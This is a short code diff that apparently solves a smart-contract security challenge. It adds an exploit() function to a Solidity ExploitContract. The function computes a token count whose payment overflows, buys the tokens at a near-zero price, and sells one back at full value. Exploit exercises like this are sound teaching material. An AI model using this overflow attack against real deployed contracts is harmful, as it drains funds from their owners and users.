@@ -43,4 +43,17 @@ contract ExploitContract {
 
     receive() external payable {}
     // write your exploit functions below
+    /// @dev trick is to overflow the required payment by putting in a large number of tokens
+    /// that just barely overflow the "total" variable. This allows buying at a major discount and
+    /// selling at full price.
+    function exploit() public payable {
+        uint numTokens = (type(uint256).max / 1 ether) + 1;
+        uint amount;
+        unchecked {
+            amount += numTokens * 1 ether;
+        }
+
+        tokenSale.buy{value: amount}(numTokens);
+        tokenSale.sell(1);
+    }
 }
